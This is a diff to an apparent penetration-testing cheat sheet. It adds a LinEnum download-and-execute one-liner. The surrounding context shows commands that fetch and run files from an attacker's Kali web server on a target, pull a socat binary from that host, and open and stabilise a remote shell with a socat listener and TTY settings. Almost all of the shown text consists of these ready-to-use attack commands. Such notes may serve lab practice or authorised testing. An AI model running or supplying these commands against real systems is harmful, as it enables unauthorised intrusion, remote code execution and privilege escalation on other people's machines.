@@ -44,6 +44,11 @@ Download file from local Web server on kali
 FILE=[FILE NAME]; wget http://10.4.49.251/$FILE -O /tmp/$FILE; chmod +x /tmp/$FILE; sh /tmp/$FILE
 ```
 
+### LinEnum
+```
+wget http://10.4.49.251/LinEnum.sh -O /tmp/LinEnum.sh; chmod +x /tmp/LinEnum.sh; /tmp/LinEnum.sh
+```
+
 ### Socat
 ・Target Host  
 ```
@@ -55,7 +60,7 @@ wget http://10.4.49.251/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exe
 socat file:`tty`,raw,echo=0 TCP-L:4445
 ```
 
-Additional Settings :
++α settings :
 ```
 export SHELL=bash; export TERM=xterm-256color; stty rows 60 columns 126
 ```
